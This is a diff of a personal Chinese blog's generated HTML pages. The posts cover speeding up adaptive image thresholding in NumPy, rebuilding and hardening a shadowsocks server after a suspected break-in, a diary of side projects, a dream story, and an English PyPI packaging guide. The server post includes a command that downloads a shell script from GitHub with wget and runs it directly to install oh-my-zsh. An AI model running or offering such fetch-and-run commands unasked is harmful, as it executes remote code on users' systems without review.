-<p>我们可以在计算累积和之前先对边界翻折来进行填充， 之后再对扩展后的矩阵进行累积和，这样可以省略掉<code>get_count_matrix</code>函数， 统一采用<code>(boxsize-1)*(boxsize-1)</code>。<br>
-</p>
+<p>我们可以在计算累积和之前先对边界翻折来进行填充， 之后再对扩展后的矩阵进行累积和，这样可以省略掉<code>get_count_matrix</code>函数， 统一采用<code>(boxsize-1)*(boxsize-1)</code>。  </p>
 <div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">optimized_vector_method</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
     <span class="n">inv_value</span> <span class="o">=</span> <span class="n">set_value</span> <span class="o">^</span> <span class="mi">255</span>
     <span class="n">half_s</span> <span class="o">=</span> <span class="n">boxsize</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
@@ -596,17 +526,13 @@ vector_method take 22.166661 ms
     <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
 </pre></div>
 
-
-<p>看看计算时间，<br>
-</p>
+<p>看看计算时间，  </p>
 <div class="highlight"><pre><span></span>⇒  python3 implement.py
 Image shape 640x480
 optimized_vector_method take 10.539570999999999 ms
 </pre></div>
 
-
-<p>比最初快了150倍， 而且超过了论文上的C语言实现的15ms的时间。<br>
-</p>
+<p>比最初快了150倍， 而且超过了论文上的C语言实现的15ms的时间。  </p>
 <h2>总结分析</h2>
 <p>对于最后的这个方法， 需要额外解释一下为什么会比论文快。<br>
 其中一个是CPU的原因， 论文上用的是4核奔腾3.4Ghz的CPU，而我自己的是i5 2.7GHz。<br>
@@ -614,29 +540,22 @@ i5应该是快一些的， （我猜）</p>
 <p>之后是在对窗口大小的计算时间上， 因为我们通过填充扩展矩阵， 使得每一个点的窗口大小都是固定的值， 比论文中的方法省去了多余的窗口大小计算和多余的边界判断。<br>
 但是扩展矩阵在计算累积和的时候有额外的时间消耗， boxsize默认采用边长的1/8， 
 构造后的矩阵比原先大了 81/64 倍的大小。<br>
-不过在之后的计算中并没有额外的消耗。<br>
-</p>
+不过在之后的计算中并没有额外的消耗。  </p>
 <p>再次， 虽然我们构造出了4个矩阵ABCD， 但是实际上没有对内存做拷贝， ABCD都是累积和矩阵上的映射， 没有对内存中的实际数据做拷贝。</p>
-<p>最后， <br>
-</p>
-<div class="highlight"><pre><span></span>integral_map = integral_map.astype(np.uint32)
+<p>最后，   </p>
+<p><div class="highlight"><pre><span></span>integral_map = integral_map.astype(np.uint32)
 </pre></div>
-
-
-<p>我指定了矩阵中的元素的大小， 统一为无符号32位， 速度又得到了一定的提升。<br>
+我指定了矩阵中的元素的大小， 统一为无符号32位， 速度又得到了一定的提升。<br>
 但是uint32有其局限， 只能存下2^32次方的数据， 灰度图的每一个点的最大取值是2^8， 于是uint32的累积矩阵只能存下2^24个像素点， 然而由于填充了边框， 矩阵比实际大了81/64， 约1.266倍， <code>sqrt(2^24/1.266) = 3640</code>,  所以只能处理3640x3640的图片， 但是从平均情况来说， 每一个点平均取2^7， 于是我们可以处理最大5148x5148的图片。</p>
-<p>到此， 完成了从最初的1600ms到10ms的优化。<br>
-</p>
+<p>到此， 完成了从最初的1600ms到10ms的优化。  </p>
 <h2>彩蛋</h2>
-<p>混沌邪恶<br>
-</p>
+<p>混沌邪恶  </p>
 <div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">cv2</span> <span class="kn">as</span> <span class="nn">cv</span>
 
 <span class="k">def</span> <span class="nf">wtf</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
     <span class="c1"># 这才叫Python嘛！</span>
     <span class="k">return</span> <span class="n">cv</span><span class="o">.</span><span class="n">adaptiveThreshold</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">cv</span><span class="o">.</span><span class="n">ADAPTIVE_THRESH_GAUSSIAN_C</span><span class="p">,</span> <span class="n">cv</span><span class="o">.</span><span class="n">THRESH_BINARY_INV</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span>
 </pre></div>
-
 
 <p>咕咕咕？？？<br>
 我选择opencv自带的局部自适应高斯二值化</p>
@@ -656,74 +575,59 @@ wtf take 8.884578000000001 ms
   </header>
   <div>
       <h2>疑似被黑</h2>
-<p>2年前和基友合力租了一台服务器用于搭建ss服务， 当年啥也不懂， 系统选的是fedora， yum install fail2ban之后主要精力就是折腾ss， 配了supervisord， 编译了hybla的模块， 就不管了。<br>
-</p>
-<p>2年来一直没出什么大事， 偶尔大面积100%丢包过一下就好了， 没当回事。<br>
-</p>
+<p>2年前和基友合力租了一台服务器用于搭建ss服务， 当年啥也不懂， 系统选的是fedora， yum install fail2ban之后主要精力就是折腾ss， 配了supervisord， 编译了hybla的模块， 就不管了。  </p>
+<p>2年来一直没出什么大事， 偶尔大面积100%丢包过一下就好了， 没当回事。  </p>
 <p>直到昨天因为系统更新准备重新编译hybla， 登录上去顺便用网上抄了的命令查看了一下当前连接量， </p>
 <div class="highlight"><pre><span></span>netstat -an | grep 443 | grep ESTABLISHED | wc -l
 </pre></div>
 
-
-<p>大的惊人， 开始慌了。<br>
-</p>
+<p>大的惊人， 开始慌了。  </p>
 <p>检查log日志， 发现大量</p>
 <div class="highlight"><pre><span></span>2016-11-16 01:16:01 ERROR can not parse header when handling connection from ::ffff:&lt;ip&gt;:&lt;port&gt;
 </pre></div>
 
-
 <p>反查这些ip， 发现都不是我们自己的ip。<br>
 我估计是被爆破了， 但是我端口用的是443， 所以也不太好确定是不是真的被爆破。
-之后就是ban ip， 换端口， 改密码。<br>
-</p>
-<p>接着开始考虑服务器本身有没有被攻破， 看了一下ssh的22端口， 发现有其他的ip在建立连接， 到这里我都没有特别慌张， 我想， 我还有fail2ban呢。<br>
-</p>
+之后就是ban ip， 换端口， 改密码。  </p>
+<p>接着开始考虑服务器本身有没有被攻破， 看了一下ssh的22端口， 发现有其他的ip在建立连接， 到这里我都没有特别慌张， 我想， 我还有fail2ban呢。  </p>
 <p>检查了一下我的fail2ban， 发现处于开启失败状态。<br>
 顺带， ssh服务没换端口， 允许root账号登录， 允许密码登录。</p>
-<p>『卧槽， 精彩了』<br>
-</p>
+<p>『卧槽， 精彩了』  </p>
 <p>赶紧联系大腿。</p>
-<p>先打<code>w</code>命令， 一片空白， 一般登录了的话至少有自己一个人， 现在什么也没有， 六神表示<code>w</code>估计被改了， 可能是被rootkit了， rootkit了的话基本就很难看出其他的东西了。<br>
-</p>
+<p>先打<code>w</code>命令， 一片空白， 一般登录了的话至少有自己一个人， 现在什么也没有， 六神表示<code>w</code>估计被改了， 可能是被rootkit了， rootkit了的话基本就很难看出其他的东西了。  </p>
 <p>往后是一些挣扎， 检查<code>ps -aux</code>， 看不出来。
 检查<code>who -a /var/log/wtmp</code>, 看一下登录的信息， 看不出来。<br>
-检查bash_history, zsh_history， 根本懒得看了。<br>
-</p>
-<p>淦他娘啊， 我选择重装！<br>
-</p>
+检查bash_history, zsh_history， 根本懒得看了。  </p>
+<p>淦他娘啊， 我选择重装！  </p>
 <h2>灾后重建</h2>
-<p>这次选了ubuntu， 而且有经验了。<br>
-</p>
+<p>这次选了ubuntu， 而且有经验了。  </p>
 <ul>
 <li>
-<p>先装<code>zsh</code>, <code>apt-get install zsh</code><br>
-</p>
+<p>先装<code>zsh</code>, <code>apt-get install zsh</code>  </p>
 </li>
 <li>
 <p>建立用户, 指定shell为zsh， <code>useradd youruser -m -s /bin/zsh</code></p>
 </li>
 <li>
-<p>上传公钥， 通过 <code>ssh-copy-id</code> 命令。<br>
-</p>
+<p>上传公钥， 通过 <code>ssh-copy-id</code> 命令。  </p>
 </li>
 <li>
-<p>更改ssh的配置， 改端口， 关root登录， 关密码登录。<br>
-</p>
-<p><code>PermitRootLogin no
+<p>更改ssh的配置， 改端口， 关root登录， 关密码登录。  </p>
+<p><div class="highlight"><pre><span></span>PermitRootLogin no
 Port 12345
-PasswordAuthentication no</code>
-* 重启ssh服务。<br>
-</p>
+PasswordAuthentication no
+</pre></div>
+* 重启ssh服务。  </p>
 </li>
 <li>
-<p>安装 <code>denyhosts</code>, <code>apt-get install denyhosts</code><br>
-</p>
+<p>安装 <code>denyhosts</code>, <code>apt-get install denyhosts</code>  </p>
 </li>
 <li>
 <p><code>oh-my-zsh</code></p>
-<p><code>sh
-apt-get install git
-sh -c "$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)"</code></p>
+<div class="highlight"><pre><span></span>apt-get install git
+sh -c <span class="s2">&quot;</span><span class="k">$(</span>wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -<span class="k">)</span><span class="s2">&quot;</span>
+</pre></div>
+
 </li>
 </ul>
 <h2>配置ss</h2>
@@ -733,13 +637,11 @@ pip install -U pip
 pip install shadowsocks
 </pre></div>
 
-
 <h4>安装密码库， 安装<code>libsodium</code>依赖</h4>
 <div class="highlight"><pre><span></span>apt-get install python-m2crypto
 apt-get install libsodium18
 pip install M2Crypto
 </pre></div>
-
 
 <h4>配置<code>/etc/shadowsocks.json</code></h4>
 <div class="highlight"><pre><span></span><span class="p">{</span>
@@ -756,26 +658,20 @@ pip install M2Crypto
 <span class="p">}</span>
 </pre></div>
 
-
 <p>服务器参数设置<code>"::"</code>可以同时监听ipv4和ipv6, user设置nobody权限， 选一个加密方式， 另外最新是可以打开OTA来防止被攻击， 但是需要客户端也支持OTA。 </p>
 <p>除此以外， 还可以用提供的 <a href="https://github.com/shadowsocks/shadowsocks/blob/master/utils/autoban.py">autoban.py</a> 来ban ip,使用方法参考<a href="https://github.com/shadowsocks/shadowsocks/wiki/Ban-Brute-Force-Crackers">Ban Brute Force Crackers</a> .<br>
 注意到同时监听ipv4和ipv6的时候， 这个代码提取ip的方式有问题，要改一下，<br>
-第41行改成<br>
-</p>
+第41行改成  </p>
 <div class="highlight"><pre><span></span>ip = line.split()[-1].split(&#39;:&#39;)[-2]
 </pre></div>
 
-
 <p><strong>（小心不要把自己ban了</strong></p>
-<p><br><br>
-</p>
+<p><br>  </p>
 <h4>关于优化</h4>
-<p>参考  <a href="https://github.com/iMeiji/shadowsocks_install/wiki/shadowsocks-optimize">shadowsocks-optimize</a>, 不重复了<br>
-</p>
+<p>参考  <a href="https://github.com/iMeiji/shadowsocks_install/wiki/shadowsocks-optimize">shadowsocks-optimize</a>, 不重复了  </p>
 <h4>配置开机自启动</h4>
 <p>rc.local ubuntu用不了， 需要自己写一个<code>shadowsocks.service</code>:<br>
-在<code>/etc/systemd/system</code>下建立一个文件， 比如<code>shadowsocks.service</code>， 写入如下内容<br>
-</p>
+在<code>/etc/systemd/system</code>下建立一个文件， 比如<code>shadowsocks.service</code>， 写入如下内容  </p>
 <div class="highlight"><pre><span></span><span class="k">[Unit]</span>
 <span class="na">Description</span><span class="o">=</span><span class="s">run ssserver on background</span>
 
@@ -788,17 +684,14 @@ pip install M2Crypto
 <span class="na">WantedBy</span><span class="o">=</span><span class="s">multi-user.target</span>
 </pre></div>
 
-
 <p>参考： <br>
 <a href="https://unix.stackexchange.com/questions/47695/how-to-write-startup-script-for-systemd">how-to-write-startup-script-for-systemd</a></p>
 <p><a href="https://www.freedesktop.org/software/systemd/man/systemd.service.html">systemd.service.html</a></p>
 <p>按说明， <code>Type</code>选<code>forking</code>而不是<code>simple</code>。</p>
-<p>之后可以用<code>systemctl start shadowsocks</code> 和<code>systemctl stop shadowsocks</code> 开关ss.<br>
-</p>
+<p>之后可以用<code>systemctl start shadowsocks</code> 和<code>systemctl stop shadowsocks</code> 开关ss.  </p>
 <p>使用 <code>systemctl enable shadowsocks</code> 让ss开机启动。</p>
 <h2>总结</h2>
-<p>~~在被日中成长~~。<br>
-</p>
+<p><del>在被日中成长</del>。  </p>
   </div>
   <hr />
 </article>
@@ -811,42 +704,28 @@ pip install M2Crypto
       <a href="http://littlezz.github.io/tag/ri-ji.html">日记</a>,      <a href="http://littlezz.github.io/tag/xia-che.html">瞎扯</a>,      <a href="http://littlezz.github.io/tag/xiao-jie.html">小结</a>    </p>
   </header>
   <div>
-      <p><img alt="" src="../images/need_fix.jpg"><br>
-</p>
-<p>最近太懒了， 之前写的几个练手的项目， 有一些没有放到github上面就已经弃坑了， 至于一些开的坑， 也处于长期不填的状态。<br>
-</p>
-<p>最近在准备写一个即时聊天的网站来练手，前端用reactjs， 后端是aiohttp， 数据库mongodb，  主要是想体验一把分布式的Websocket 和Python3.5 的<code>await/async</code>语法的。但是按现在的进度看来要花大把的时间在前端上面了， 我一年前不知道为什么两个元素会上下排列， 一年后还是不知道为什么。<br>
-</p>
+      <p><img alt="" src="../images/need_fix.jpg">  </p>
+<p>最近太懒了， 之前写的几个练手的项目， 有一些没有放到github上面就已经弃坑了， 至于一些开的坑， 也处于长期不填的状态。  </p>
+<p>最近在准备写一个即时聊天的网站来练手，前端用reactjs， 后端是aiohttp， 数据库mongodb，  主要是想体验一把分布式的Websocket 和Python3.5 的<code>await/async</code>语法的。但是按现在的进度看来要花大把的时间在前端上面了， 我一年前不知道为什么两个元素会上下排列， 一年后还是不知道为什么。  </p>
 <p>前端， 总是给我一种五五开的『这他妈是什么， 这他妈又是什么』的感觉。</p>
-<p>不久前写过一个chrome的插件<a href="https://github.com/littlezz/PixivFast">PixivFast</a>， 用来让我在p站刷图时可以不用点开大图之后再右键另存为， 而是按一下<code>s</code>就可以弹出下载大图的会话框。 实用， 但是没放到google商店上， 而且我还想着再加一个同时给10分评分的功能， 于是就一直拖着。目前有一名忠实的用户——我自己， 不过由于没有在google商店上面发布， 每次重启浏览器都得重新安装插件， 就现状看来， 这个『忠实』的用户也快叛变了。<br>
-</p>
+<p>不久前写过一个chrome的插件<a href="https://github.com/littlezz/PixivFast">PixivFast</a>， 用来让我在p站刷图时可以不用点开大图之后再右键另存为， 而是按一下<code>s</code>就可以弹出下载大图的会话框。 实用， 但是没放到google商店上， 而且我还想着再加一个同时给10分评分的功能， 于是就一直拖着。目前有一名忠实的用户——我自己， 不过由于没有在google商店上面发布， 每次重启浏览器都得重新安装插件， 就现状看来， 这个『忠实』的用户也快叛变了。  </p>
 <p>还有一个备份A岛讨论串的爬虫， <a href="https://github.com/littlezz/island-backup">island-backup</a>, 用aiohttp写的。当初野心勃勃， 如今也只是剩下几个自己开的issue没关， kukuku岛禁用api接口之后我懒得再管, 于是现在只能用于主岛。甚至github上面代码到了v1.1.2， 但是pypi上面还是停留在v1.0.1。<br>
-懒到不想打包。<br>
-</p>
+懒到不想打包。  </p>
 <p>其实api接口禁用之后解析html就好了， 懒。 我之前写过一个搜索出A岛回复数超过一定量的串的程序， 当时是有精力啊， 支持A岛， 哭哭哭岛， 备胎岛， 甚至是K岛， 里面有socks的代理设置， 而且还图形化了，用的是自带的tk。 然后呢？mac上面的tk有问题， 触摸板双指滑动tk就崩， 我自己的mac上面下载了新的tk， 没有问题，  后来兴致勃勃的跑去给蛋蛋试用， 他从github上克隆好程序装好所需的依赖， 启动之后双指一上滑， Duang！ </p>
 <p>我和他解释啊， 这不是我的锅啊， 这是tk的锅啊， tk的锅啊， 底层的锅啊， 我救不了啊。 </p>
 <p>你要不装个新的tk试试？ </p>
-<p>他给了我一个关爱智障的眼神。<br>
-</p>
-<p><img alt="" src="../images/2.jpg"><br>
-</p>
-<p>这个项目后来也不了了之了， 我自己都不用。<br>
-</p>
+<p>他给了我一个关爱智障的眼神。  </p>
+<p><img alt="" src="../images/2.jpg">  </p>
+<p>这个项目后来也不了了之了， 我自己都不用。  </p>
 <p>后来还写了一个<a href="https://github.com/littlezz/ESL-Model">ESL-Model</a>, 这东西我都不想说， 现在都快成黑历史了， 我原先计划把那本 The Elements of statistical Learning 上面的方法全部实现一遍的， 后来大概止步于卷积神经网络的那个patch和步长不能刚好走完一层， 比如书上说patch 3x3, 每次走两格， 但是那一层是16x16， 不能刚好走完啊。我看那个cs231也是刚好能够走完一层的， 于是我就懵逼了啊。<br>
 彼时日常生活也发生了些事情， 我没有精力再搞， 于是放了两个月， 到得现在大概是放弃了。 彻底是一个坑了。</p>
-<p>唉都是借口， 都是懒。<br>
-</p>
-<p>我还是计划一下之后怎么办吧，虽然都是练手， 没什么时间的要求， 但是老拖下去也不是办法。<br>
-</p>
-<p>至少：<br>
-</p>
+<p>唉都是借口， 都是懒。  </p>
+<p>我还是计划一下之后怎么办吧，虽然都是练手， 没什么时间的要求， 但是老拖下去也不是办法。  </p>
+<p>至少：  </p>
 <ul>
-<li>pixivfast 给弄完交钱注册个账号放到google商店上。<br>
-</li>
-<li>island_backup 把issue清了。<br>
-</li>
-<li>计划的练手的项目给写了。<br>
-</li>
+<li>pixivfast 给弄完交钱注册个账号放到google商店上。  </li>
+<li>island_backup 把issue清了。  </li>
+<li>计划的练手的项目给写了。  </li>
 </ul>
 <p>先这样吧。</p>
 <p>2016年08月17日18:17:19</p>
@@ -863,70 +742,45 @@ pip install M2Crypto
   </header>
   <div>
       <p>我在上课。<br>
-如同之前我上过的无数的课一样， 我完全没有在听。<br>
-</p>
-<p>老师要求我们在书本上做题， 之后使用像超市里面的条形码扫描器一样的机器在书本上一扫， 平时分就出来了。<br>
-</p>
+如同之前我上过的无数的课一样， 我完全没有在听。  </p>
+<p>老师要求我们在书本上做题， 之后使用像超市里面的条形码扫描器一样的机器在书本上一扫， 平时分就出来了。  </p>
 <p>当然， 这种机器看上去高级， 但总是给人一种玩具的感觉。有些人的分数就是飘忽不定， 一会儿是二十几分， 一会儿是六十几分， 这取决于使用扫描器时的角度， 是个依赖耐心和运气的活儿。   <br>
-不过使用者虽然有耐心， 但是其他同学还在等着用啊， 于是乱糟糟的， 催别人快一些的， 拿高分的发表扫描器使用经验谈的， 拿低分大叫不公平等着再试一次的。<br>
-</p>
+不过使用者虽然有耐心， 但是其他同学还在等着用啊， 于是乱糟糟的， 催别人快一些的， 拿高分的发表扫描器使用经验谈的， 拿低分大叫不公平等着再试一次的。  </p>
 <p>看够了， 我才发现我不知道教材是什么， 看看邻座的，还好， 我桌子上有了一本， 可是完全不知道要写哪里。<br>
-此时老师已经拿着扫描仪走到我旁边了， 我还没有找到对应的页数， 一把抽过邻座的书， 74页， 我看了一下自己的书， 第71页， 赶紧一翻， 老师也在这时走到了我身旁。<br>
-</p>
-<p>我希望他没有看到我空空如也的书本， 对他说先检查邻座的吧。<br>
-</p>
-<p>末了， 老师说时间不够了， 没有检查的同学下课了过去找他。我松了一口气， 赶紧对着邻座的书本抄， 题目是填写一个巨大且数目繁多的表格。<br>
-</p>
+此时老师已经拿着扫描仪走到我旁边了， 我还没有找到对应的页数， 一把抽过邻座的书， 74页， 我看了一下自己的书， 第71页， 赶紧一翻， 老师也在这时走到了我身旁。  </p>
+<p>我希望他没有看到我空空如也的书本， 对他说先检查邻座的吧。  </p>
+<p>末了， 老师说时间不够了， 没有检查的同学下课了过去找他。我松了一口气， 赶紧对着邻座的书本抄， 题目是填写一个巨大且数目繁多的表格。  </p>
 <p>放学后走在回家的路上， 我带着耳机， 放着the pillows的《one life》，和一个女生并肩走着， 我低着头看我的脚抬起又落下， 配合着节拍， 正当我觉得风景正好， 晚霞染红了半片天， 心情舒畅， 斗志昂扬的时候， 我想起这样带着耳机和一个女孩走路不太礼貌， 继而我突然想到我忘记去给老师检查我的作业了。</p>
 <p>于是事情最终演变成了我摘下耳机， 停下了脚步， 在兴奋劲还没有散去的脸上新添了一份略带惶恐的表情：『完了， 我忘记给老师检查了， 平时分没有了。  』</p>
-<p>女孩或许说了些什么， 我没在听， 但是我才注意到我喜欢这个女孩， 但是他是不是我的女朋友呢， 好像也不是， 我们可能是在恋爱期吧。<br>
-</p>
-<p>我觉得没有什么比现在和女孩一起走在回家的路上更重要的了， 瞬间忘光了检查作业的事情， 毕竟， 现在回学校也没有什么用了。<br>
-</p>
-<p>到了一处池塘， 池塘旁边放满了五花八门的脸盆和塑料桶。 这个池塘里面有各种各样的鱼， 以黑色的草鱼为主。 一个无主的池塘， 鱼儿平时可能就吃一些水草吧， 所以鱼饵一下去， 立马咬钩， 但是钓上来的鱼却总是又肥又大， 池塘旁边的各式各样的盆和桶用于给垂钓者临时存放钓上来的鱼， 偶尔来得早了还能发现几根普通的『随手』杆。  总之， 一个免费且设施齐全的自助鱼塘。<br>
-</p>
-<p>我们商量着钓一条鱼回去， 取了一根鱼竿， 立马就钓上来了一条， 这时我才发现没有准备好保存鱼的桶。<br>
-</p>
-<p>我用手握着黏糊糊的挣扎着的鱼， 问女孩， 你愿意拿着鱼还是愿意打一桶水？<br>
-</p>
-<p>女孩看着鱼， 不语。<br>
-</p>
-<p>都不愿意？<br>
-</p>
-<p>女孩点了点头。<br>
-</p>
+<p>女孩或许说了些什么， 我没在听， 但是我才注意到我喜欢这个女孩， 但是他是不是我的女朋友呢， 好像也不是， 我们可能是在恋爱期吧。  </p>
+<p>我觉得没有什么比现在和女孩一起走在回家的路上更重要的了， 瞬间忘光了检查作业的事情， 毕竟， 现在回学校也没有什么用了。  </p>
+<p>到了一处池塘， 池塘旁边放满了五花八门的脸盆和塑料桶。 这个池塘里面有各种各样的鱼， 以黑色的草鱼为主。 一个无主的池塘， 鱼儿平时可能就吃一些水草吧， 所以鱼饵一下去， 立马咬钩， 但是钓上来的鱼却总是又肥又大， 池塘旁边的各式各样的盆和桶用于给垂钓者临时存放钓上来的鱼， 偶尔来得早了还能发现几根普通的『随手』杆。  总之， 一个免费且设施齐全的自助鱼塘。  </p>
+<p>我们商量着钓一条鱼回去， 取了一根鱼竿， 立马就钓上来了一条， 这时我才发现没有准备好保存鱼的桶。  </p>
+<p>我用手握着黏糊糊的挣扎着的鱼， 问女孩， 你愿意拿着鱼还是愿意打一桶水？  </p>
+<p>女孩看着鱼， 不语。  </p>
+<p>都不愿意？  </p>
+<p>女孩点了点头。  </p>
 <p>我四处望了望， 看到一个老同学也在钓鱼， 身旁放着一个盆和一个细长的桶， 看来他今天收获不小。<br>
 我走到同学的身旁， 向他表达了暂时存放一下我的鱼的请求， 他同意了。 我开始小小翼翼从鱼嘴上取下带着倒刺的鱼钩。 从它被钓上来开始已经过去一段时间了， 它在我手里的挣扎幅度越来越小， 可是到现在我也还是没能取下鱼钩， 最后， 鱼不动了， 眼看着是要不活了。这时，我同学一把夺过我手里的鱼， 另一只手拉住鱼线， 使劲一拔， 鱼钩连同着半片鱼唇一同飞出。<br>
-他将鱼还给了我， 那半片鱼唇飞到天上的场景还历历在目， 我问他， 这样会不会太粗暴了， 他笑道， 鱼哪懂？<br>
-</p>
+他将鱼还给了我， 那半片鱼唇飞到天上的场景还历历在目， 我问他， 这样会不会太粗暴了， 他笑道， 鱼哪懂？  </p>
 <p>我把鱼放到了水里， 可是它一动也不动了。<br>
 死了么？我问道。<br>
-同学瞟了一眼， 没事， 命硬着呢。<br>
-</p>
-<p>过了一会儿， 鱼动了一下， 好像是打了一个寒颤， 之后又欢快的游了起来。<br>
-</p>
-<p>放下心后， 我去到存放木桶的地方， 发现脸盆和木桶早已取尽， 今天来钓鱼的人很多，这下我无计可施了， 想了想， 去向刚才的同学借那个细长的木桶吧。<br>
-</p>
-<p>来来回回了好几趟， 终于可以把鱼带回去了， 我把细长的木桶侵入水里， 抽出来时觉得格外的轻， 定睛一看， 发现下面打满了洞， 这哪里是木桶， 这是捞鱼用的捞勺啊。<br>
-</p>
+同学瞟了一眼， 没事， 命硬着呢。  </p>
+<p>过了一会儿， 鱼动了一下， 好像是打了一个寒颤， 之后又欢快的游了起来。  </p>
+<p>放下心后， 我去到存放木桶的地方， 发现脸盆和木桶早已取尽， 今天来钓鱼的人很多，这下我无计可施了， 想了想， 去向刚才的同学借那个细长的木桶吧。  </p>
+<p>来来回回了好几趟， 终于可以把鱼带回去了， 我把细长的木桶侵入水里， 抽出来时觉得格外的轻， 定睛一看， 发现下面打满了洞， 这哪里是木桶， 这是捞鱼用的捞勺啊。  </p>
 <p>我独自苦笑， 转身寻找女孩， 向他举了举我的捞勺， 自嘲了几句。<br>
-不远处， 女孩在和一个男生嬉笑着聊天， 她向我回了一个微笑， 接着继续投入到和男生的谈笑中， 我不知道他们在谈论什么， 我看到她笑得腰都弯了， 可是我听不到他们的声音，明明隔得不远。<br>
-</p>
-<p>我突然发现天色已经很晚了， 晚霞早已不见， 留下雾沉沉的黑暗， 地上泛着些许的银光，透过雾气， 有些朦胧。<br>
-</p>
-<p>我想， 回家吧。<br>
-</p>
+不远处， 女孩在和一个男生嬉笑着聊天， 她向我回了一个微笑， 接着继续投入到和男生的谈笑中， 我不知道他们在谈论什么， 我看到她笑得腰都弯了， 可是我听不到他们的声音，明明隔得不远。  </p>
+<p>我突然发现天色已经很晚了， 晚霞早已不见， 留下雾沉沉的黑暗， 地上泛着些许的银光，透过雾气， 有些朦胧。  </p>
+<p>我想， 回家吧。  </p>
 <p><br></p>
 <p>. . . . . .</p>
 <p><br></p>
-<p>和女孩站在电梯里， 看着电梯的门缓缓的关上——最终， 我还是发现了一个木桶， 带着鱼去女孩家吃晚饭了。—— 女孩在电梯楼层上面按了一下， 我才发现， 这栋楼好高， 我看到楼层按钮的左下角写着13， 我才想起我应该和我妈打个电话， 告诉他我不回去吃饭了。<br>
-</p>
+<p>和女孩站在电梯里， 看着电梯的门缓缓的关上——最终， 我还是发现了一个木桶， 带着鱼去女孩家吃晚饭了。—— 女孩在电梯楼层上面按了一下， 我才发现， 这栋楼好高， 我看到楼层按钮的左下角写着13， 我才想起我应该和我妈打个电话， 告诉他我不回去吃饭了。  </p>
 <p>电梯开始上升， 我拨通了我妈的电话。<br>
-『喂， 妈， 我今天晚上不回去吃饭了....我去， 去...额...』<br>
-</p>
+『喂， 妈， 我今天晚上不回去吃饭了....我去， 去...额...』  </p>
 <p>我把电话拿开， 扭过头来看着女孩， 向她问道：<br>
-『你算是我的女朋友么？』<br>
-</p>
+『你算是我的女朋友么？』  </p>
 <p><br> </p>
 <p>梦醒了。</p>
 <p><br></p>
@@ -946,8 +800,7 @@ pip install M2Crypto
       <h2>Install twine</h2>
 <p><code>pip install twine</code></p>
 <h2>Init file</h2>
-<p>First of all, make sure that the structure of project is correct. Says, your project code in a folder call 'foo', then you have <code>README</code> and some other files in the same level.<br>
-</p>
+<p>First of all, make sure that the structure of project is correct. Says, your project code in a folder call 'foo', then you have <code>README</code> and some other files in the same level.  </p>
 <p>For example, </p>
 <div class="highlight"><pre><span></span>.
 ├── foo
@@ -955,16 +808,11 @@ pip install M2Crypto
 └── readme.md
 </pre></div>
 
-
-<p>Secondly, add specify file to the root folder.<br>
-</p>
+<p>Secondly, add specify file to the root folder.  </p>
 <ul>
-<li>README.rst<br>
-</li>
-<li>MANIFEST.in<br>
-</li>
-<li>setup.py<br>
-</li>
+<li>README.rst  </li>
+<li>MANIFEST.in  </li>
+<li>setup.py  </li>
 <li>setup.cfg(option)</li>
 </ul>
 <p>pypi do not know markdown format readme, there is only rst format available.</p>
@@ -972,35 +820,27 @@ pip install M2Crypto
 <p>look at
 <a href="https://github.com/pypa/sampleproject/blob/master/setup.py">https://github.com/pypa/sampleproject/blob/master/setup.py</a></p>
 <p>after finish <code>setup.py</code><br>
-you can use <br>
-</p>
+you can use   </p>
 <p><code>pip install -e .</code>
 install package locally on editable mode.<br>
-It will also install dependency.<br>
-</p>
+It will also install dependency.  </p>
 <h2>Make dist</h2>
 <h3>Build source distribution</h3>
 <p>run<br>
-<code>python setup.py sdist</code><br>
-</p>
+<code>python setup.py sdist</code>  </p>
 <h3>Build wheel.</h3>
 <p>If your code compat py2 and py3.<br>
-<code>python setup.py bdist_wheel --universal</code><br>
-</p>
+<code>python setup.py bdist_wheel --universal</code>  </p>
 <p>else, 
-<code>python setup.py bdist_wheel</code><br>
-</p>
-<p>if your code is specify for some python version, add python tag in <code>setup.cfg</code><br>
-</p>
+<code>python setup.py bdist_wheel</code>  </p>
+<p>if your code is specify for some python version, add python tag in <code>setup.cfg</code>  </p>
 <p>For example, if your code is only available in py3.5 and 3.4 </p>
 <div class="highlight"><pre><span></span><span class="k">[bdist_wheel]</span>
 <span class="na">python-tag</span> <span class="o">=</span> <span class="s">py35, py34</span>
 </pre></div>
 
-
 <h2>Upload</h2>
-<p>look at <a href="http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/#uploading-your-project-to-pypi">http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/#uploading-your-project-to-pypi</a><br>
-</p>
+<p>look at <a href="http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/#uploading-your-project-to-pypi">http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/#uploading-your-project-to-pypi</a>  </p>
 <p>Create a account on pypi, register your package,  write a <code>~/.pypirc</code> </p>
 <div class="highlight"><pre><span></span><span class="k">[distutils]</span>
 <span class="na">index-servers</span><span class="o">=</span><span class="s">pypi</span>
@@ -1011,19 +851,13 @@ It will also install dependency.<br>
 <span class="na">password</span> <span class="o">=</span> <span class="s">&lt;password&gt;</span>
 </pre></div>
 
-
-<p>left the password empty, you can use twine with <code>-p PASSWORD</code>.<br>
-</p>
-<p>upload your dist folder<br>
-</p>
-<p><code>twine upload dist/*</code><br>
-</p>
+<p>left the password empty, you can use twine with <code>-p PASSWORD</code>.  </p>
